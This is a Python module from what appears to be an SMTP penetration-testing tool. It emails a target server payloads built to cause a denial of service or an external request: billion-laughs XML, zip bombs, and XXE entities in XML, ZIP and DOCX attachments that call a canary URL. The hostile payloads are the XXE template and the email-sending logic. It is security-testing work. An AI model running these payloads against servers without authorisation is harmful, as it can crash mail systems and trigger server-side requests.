"""ZIPXXE — zip bomb, billion laughs, XXE."""
import ipaddress, smtplib, socket, ssl, time, zipfile
from io import BytesIO
from email.encoders import encode_base64
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from ..utils.decompression_payloads import BILLION_LAUGHS_XML, build_full_zip_bomb, build_minimal_zip_bomb
from ..utils.helpers import *
from ..utils.results import *
from ..utils.registry import *

from ._common import eng


__MODULELABEL__ = "ZIPXXE Test – Zip Bomb, Billion Laughs, XXE"
__MODULECODE__ = "ZIPXXE"
__ORDER__ = 270


def _zipxxe_variant_title(e, variant: str) -> str:
    return ZIPXXE_VARIANT_TITLES.get(variant, variant.replace('_', ' ').strip().title() + ' test')


def _zipxxe_variant_payload_label(e, variant: str) -> str:
    return ZIPXXE_VARIANT_PAYLOAD_LABELS.get(variant, variant.replace('_', ' '))


def _zipxxe_variant_outcome_line(e, v: ZipxxeVariantResult) -> str:
    label = _zipxxe_variant_payload_label(e, v.variant)
    if v.accepted > 0:
        for line in reversed(v.smtp_trace):
            if line.startswith('DATA:'):
                code = e._data_trace_status_code(line) or '250'
                return f'{label}: {code} (accepted)'
        return f'{label}: 250 (accepted)'
    if v.rejected > 0:
        for line in reversed(v.smtp_trace):
            if line.startswith('DATA:'):
                code = e._data_trace_status_code(line) or '?'
                return f'{label}: {code} (rejected)'
        return f'{label}: (rejected)'
    if v.error > 0:
        reason = e._smtp_detail_one_line(v.detail) or 'error'
        return f'{label}: error ({reason})'
    return f'{label}: (skipped)'


def _zipxxe_stream_variant_section(e, v: ZipxxeVariantResult, rcpt: str, *, stream_trace: bool=False) -> None:
    """Per-variant terminal block for -zipxxe."""
    pp = e._ptprint_raw
    pp(_zipxxe_variant_title(e, v.variant), bullet_type='TITLE', condition=True, indent=4)
    if stream_trace:
        for line in v.smtp_trace:
            if line.startswith('---'):
                continue
            e._stream_smtp_trace_line(line, indent_override=8)
    pp(_zipxxe_variant_outcome_line(e, v), bullet_type='TEXT', condition=True, indent=8)
    if v.detail:
        pp(f'Summary: {v.detail}', bullet_type='TEXT', condition=True, indent=8)
    if v.accepted > 0 and v.test_id:
        e._pp_mail_probe_line(pp, True, accepted=True, sent_msg=e._mail_sent_inbox_msg(rcpt, v.test_id), indent=8)


def test_zipxxe(e) -> ZipxxeResult:
    """
        Test Zip Bomb, XML Entity Expansion (Billion Laughs), XXE in ZIP/OOXML (PTL-SVC-SMTP-ZIPXXE).
        Sends emails with malicious attachments/body. User monitors server and canary for impact.
        """
    host = e.args.target.ip
    port = e.args.target.port
    rcpt = str(e.args.rcpt_to).strip()
    canary_url = str(getattr(e.args, 'zipxxe_canary_url', '') or '').strip()
    mail_from = e.args.mail_from or f'zipxxetest@{e.fqdn}'
    mail_from = str(mail_from).strip()
    from_name = getattr(e.args, 'from_name', None) or ''
    timeout = max(5.0, getattr(e.args, 'zipxxe_timeout', 30.0))
    variants_arg = getattr(e.args, 'zipxxe_variants', None)
    incl_zip_bomb = getattr(e.args, 'zipxxe_zip_bomb', False)
    incl_zip_bomb_full = getattr(e.args, 'zipxxe_zip_bomb_full', False)
    default_variants = ['billion_laughs_attach', 'billion_laughs_body', 'xxe_zip', 'xxe_docx', 'xxe_body']
    if variants_arg:
        variants = [v.strip().lower() for v in variants_arg.split(',') if v.strip()]
    else:
        variants = list(default_variants)
    if incl_zip_bomb and 'zip_bomb' not in variants:
        variants.append('zip_bomb')
    if incl_zip_bomb_full and 'zip_bomb_full' not in variants:
        variants.append('zip_bomb_full')

    def _xxe_xml_template(url: str) -> str:
        return f'<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{url}">]>\n<document><content>&xxe;</content></document>'

    def _build_zip_with_xxe(url: str) -> bytes:
        bio = BytesIO()
        xml_content = _xxe_xml_template(url).encode('utf-8')
        with zipfile.ZipFile(bio, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr('report.xml', xml_content)
        return bio.getvalue()

    def _build_minimal_docx_with_xxe(url: str) -> bytes:
        """Minimal OOXML .docx with XXE in word/document.xml."""
        xml_content = _xxe_xml_template(url).encode('utf-8')
        bio = BytesIO()
        with zipfile.ZipFile(bio, 'w', zipfile.ZIP_DEFLATED) as zf:
            zf.writestr('[Content_Types].xml', '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>'.encode('utf-8'))
            zf.writestr('_rels/.rels', '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>'.encode('utf-8'))
            zf.writestr('word/document.xml', xml_content)
        return bio.getvalue()
    _ssl_ctx = ssl._create_unverified_context()
    use_tls = e.args.tls or port == 465
    use_starttls = e.args.starttls and (not use_tls)
    from_hdr = f'"{from_name}" <{mail_from}>' if from_name else f'<{mail_from}>'
    start_time = time.perf_counter()
    auth_used = False
    var_results: list[ZipxxeVariantResult] = []
    e._zipxxe_streamed_live = False
    e._zipxxe_canary_streamed = False
    VERIFICATION_INSTRUCTIONS = 'Monitor server CPU, memory, disk, SMTP responsiveness. For XXE variants, check canary for HTTP requests. FAIL if significant slowdown, freeze, restart, or disk exhaustion occurs.'
    if not e.use_json and canary_url:
        pp = e._ptprint_raw
        pp('Canary URL', bullet_type='TITLE', condition=True, indent=4)
        pp(canary_url, bullet_type='TEXT', condition=True, indent=8)
        e._zipxxe_canary_streamed = True

    def _zipxxe_trace_append(trace: list[str], line: str) -> None:
        trace.append(line)

    def _connect_zipxxe() -> tuple[smtplib.SMTP | smtplib.SMTP_SSL | None, str]:
        try:
            if use_tls:
                try:
                    ipaddress.ip_address(host)
                    _sni = None
                except ValueError:
                    _sni = host
                sock = socket.create_connection((host, port), timeout=min(30.0, timeout))
                sock_ssl = _ssl_ctx.wrap_socket(sock, server_hostname=_sni)
                smtp = smtplib.SMTP(timeout=timeout)
                smtp.sock = sock_ssl
                smtp.file = None
                st, _ = smtp.getreply()
                if st != 220:
                    return (None, f'Connect: {st}')
                return (smtp, '')
            smtp = smtplib.SMTP(timeout=timeout)
            st, _ = smtp.connect(host, port)
            if st != 220:
                return (None, f'Connect: {st}')
            if use_starttls:
                st2, _ = smtp.docmd('STARTTLS')
                if st2 != 220:
                    return (None, f'STARTTLS: {st2}')
                try:
                    ipaddress.ip_address(host)
                    _sni = None
                except ValueError:
                    _sni = host
                sock_ssl = _ssl_ctx.wrap_socket(smtp.sock, server_hostname=_sni)
                smtp.sock = sock_ssl
                smtp.file = None
                smtp.helo_resp = None
                smtp.ehlo_resp = None
                smtp.esmtp_features = {}
                smtp.does_esmtp = False
            return (smtp, '')
        except Exception as ex:
            return (None, str(ex))

    def _build_mime_with_attachment(subject: str, body: str, attachment_data: bytes, filename: str, test_id: str, content_type: str='application/octet-stream') -> str:
        msg = MIMEMultipart('mixed')
        msg['Subject'] = subject
        msg['From'] = from_hdr
        msg['To'] = f'<{rcpt}>'
        msg['Date'] = time.strftime('%a, %d %b %Y %H:%M:%S +0000', time.gmtime())
        msg[EMAIL_HDR_TEST] = EMAIL_TEST_ZIPXXE
        msg[EMAIL_HDR_TEST_ID] = test_id
        msg.attach(MIMEText(body, 'plain', 'utf-8'))
        part = MIMEBase(*content_type.split('/', 1))
        part.set_payload(attachment_data)
        encode_base64(part)
        part.add_header('Content-Disposition', 'attachment', filename=filename)
        msg.attach(part)
        return msg.as_string()
    for var_name in variants:
        if var_name in ('xxe_zip', 'xxe_docx', 'xxe_body') and (not canary_url):
            continue
        smtp, conn_err = _connect_zipxxe()
        sent, accepted, rejected, err_count = (0, 0, 0, 0)
        smtp_trace: list[str] = []
        zip_test_id = ''
        gap_detail = ''
        if smtp is None:
            err_count = 1
            gap_detail = conn_err or 'connection failed'
            _zipxxe_trace_append(smtp_trace, f'Connect: {gap_detail}')
        else:
            try:
                subject = e._outbound_subject()
                body = e._outbound_data()
                zip_test_id = e._new_mail_test_id()
                if var_name == 'billion_laughs_attach':
                    raw_msg = _build_mime_with_attachment(subject, body, BILLION_LAUGHS_XML.encode('utf-8'), 'billion_laughs.xml', zip_test_id, 'application/xml')
                elif var_name == 'billion_laughs_body':
                    raw_msg = e._mime_add_test_id_header(f"From: {from_hdr}\r\nTo: <{rcpt}>\r\nSubject: {subject}\r\nMIME-Version: 1.0\r\nContent-Type: application/xml; charset=utf-8\r\nDate: {time.strftime('%a, %d %b %Y %H:%M:%S +0000', time.gmtime())}\r\n{EMAIL_HDR_TEST}: {EMAIL_TEST_ZIPXXE}\r\n\r\n{BILLION_LAUGHS_XML}", zip_test_id)
                elif var_name == 'xxe_zip':
                    zip_data = _build_zip_with_xxe(canary_url)
                    raw_msg = _build_mime_with_attachment(subject, body, zip_data, 'report.zip', zip_test_id, 'application/zip')
                elif var_name == 'xxe_docx':
                    docx_data = _build_minimal_docx_with_xxe(canary_url)
                    raw_msg = _build_mime_with_attachment(subject, body, docx_data, 'document.docx', zip_test_id, 'application/vnd.openxmlformats-officedocument.wordprocessingml.document')
                elif var_name == 'xxe_body':
                    xxe_body_xml = _xxe_xml_template(canary_url)
                    raw_msg = e._mime_add_test_id_header(f"From: {from_hdr}\r\nTo: <{rcpt}>\r\nSubject: {subject}\r\nMIME-Version: 1.0\r\nContent-Type: application/xml; charset=utf-8\r\nDate: {time.strftime('%a, %d %b %Y %H:%M:%S +0000', time.gmtime())}\r\n{EMAIL_HDR_TEST}: {EMAIL_TEST_ZIPXXE}\r\n\r\n{xxe_body_xml}", zip_test_id)
                elif var_name == 'zip_bomb':
                    zip_data = build_minimal_zip_bomb()
                    raw_msg = _build_mime_with_attachment(subject, body, zip_data, 'zipbomb.zip', zip_test_id, 'application/zip')
                elif var_name == 'zip_bomb_full':
                    zip_data = build_full_zip_bomb()
                    raw_msg = _build_mime_with_attachment(subject, body, zip_data, 'zipbomb_full.zip', zip_test_id, 'application/zip')
                else:
                    continue
                ehlo_st, ehlo_reply = smtp.docmd('EHLO', e.fqdn or 'zipxxe-test.local')
                _zipxxe_trace_append(smtp_trace, f'EHLO: {e._smtp_trace_reply(ehlo_st, ehlo_reply)}')
                used_auth, auth_err = e._mail_test_auth_login(smtp, smtp_trace, trace_append=lambda line: _zipxxe_trace_append(smtp_trace, line))
                if auth_err:
                    err_count = 1
                    gap_detail = auth_err
                    _zipxxe_trace_append(smtp_trace, auth_err)
                elif used_auth:
                    auth_used = True
                if not auth_err:
                    mail_st, mail_reply = smtp.docmd('MAIL', f'FROM:<{mail_from}>')
                    _zipxxe_trace_append(smtp_trace, f'MAIL FROM <{mail_from}>: {e._smtp_trace_reply(mail_st, mail_reply)}')
                    if mail_st not in (250, 251):
                        err_count = 1
                        gap_detail = f'{e._smtp_trace_reply(mail_st, mail_reply)} (content not sent)'
                    else:
                        status, reply = smtp.docmd('RCPT', f'TO:<{rcpt}>')
                        _zipxxe_trace_append(smtp_trace, f'RCPT TO <{rcpt}>: {e._smtp_trace_reply(status, reply)}')
                        if status not in (250, 251):
                            err_count = 1
                            gap_detail = f'{e._smtp_trace_reply(status, reply)} (content not sent)'
                        else:
                            data_status, data_reply = smtp.data(raw_msg)
                            sent = 1
                            _zipxxe_trace_append(smtp_trace, e._data_trace_entry(raw_msg, data_status, data_reply))
                            if data_status == 250:
                                accepted = 1
                            else:
                                rejected = 1
                try:
                    smtp.quit()
                except Exception:
                    pass
            except (smtplib.SMTPResponseException, smtplib.SMTPServerDisconnected, ConnectionResetError, BrokenPipeError, OSError, socket.timeout) as ex:
                err_count = 1
                gap_detail = str(ex)
                _zipxxe_trace_append(smtp_trace, f'error: {ex}')
                try:
                    if smtp:
                        smtp.quit()
                except Exception:
                    pass
        if gap_detail:
            detail = gap_detail
        elif sent or err_count:
            detail = f'{accepted} accepted, {rejected} rejected, {err_count} error'
        else:
            detail = 'skipped'
        variant_result = ZipxxeVariantResult(variant=var_name, sent=sent, accepted=accepted, rejected=rejected, error=err_count, smtp_trace=tuple(smtp_trace), detail=detail, message_summary=(), test_id=zip_test_id if accepted else '')
        var_results.append(variant_result)
        if not e.use_json:
            e._zipxxe_streamed_live = True
            _zipxxe_stream_variant_section(e, variant_result, rcpt, stream_trace=True)
    elapsed = time.perf_counter() - start_time
    total_accepted = sum((v.accepted for v in var_results))
    total_sent = sum((v.sent for v in var_results))
    any_error = any((v.error for v in var_results))
    all_rejected_at_rcpt = False
    if total_sent == 0:
        detail = 'Test incomplete: no variant reached DATA (connection error, timeout, rate limit, or recipient rejected before content was sent)' if any_error or var_results else 'No variants sent; check connection.'
    else:
        detail = f'{total_accepted}/{total_sent} variants with successful DATA (250 OK).'
        if any_error:
            detail += ' Some variants failed before DATA and were not scored.'
    return ZipxxeResult(manual_verification_required=True, canary_url=canary_url or '', variants=tuple(var_results), elapsed_sec=elapsed, auth_used=auth_used, detail=detail, verification_instructions=VERIFICATION_INSTRUCTIONS, all_rejected_at_rcpt=all_rejected_at_rcpt)


def _stream_zipxxe_result(e) -> None:
    pp = e._ptprint_raw
    show = not e.use_json
    if (err := e.results.zipxxe_error) is not None:
        pp(f'ZIPXXE test failed: {err}', bullet_type='VULN', condition=show, indent=4)
        return
    zr = e.results.zipxxe
    if zr is None or not show:
        return
    rcpt = str(e.args.rcpt_to).strip()
    if zr.canary_url and (not getattr(e, '_zipxxe_canary_streamed', False)):
        pp('Canary URL', bullet_type='TITLE', condition=show, indent=4)
        pp(zr.canary_url, bullet_type='TEXT', condition=show, indent=8)
    if not getattr(e, '_zipxxe_streamed_live', False):
        for v in zr.variants:
            _zipxxe_stream_variant_section(e, v, rcpt, stream_trace=False)
    mail_sent = any((v.accepted > 0 for v in zr.variants))
    extra: tuple[str, ...] = ()
    if zr.all_rejected_at_rcpt:
        extra = ('All variants rejected at RCPT phase — content-level protection could not be assessed.',)
    if mail_sent:
        extra = extra + tuple((p.strip() for p in (zr.verification_instructions or '').split('\n') if p.strip()))
    e._pp_av_summary_block(pp, show=show, detail=zr.detail, elapsed_sec=zr.elapsed_sec, extra_lines=extra)


def run(ctx):
    e = eng(ctx)
    e.args.zipxxe = True
    try:
        e.results.zipxxe = test_zipxxe(e)
    except Exception as ex:
        e.results.zipxxe_error = str(ex)
        ctx.out(f"ZIPXXE failed: {ex}", "ERROR", indent=4)
        return
    _stream_zipxxe_result(e)
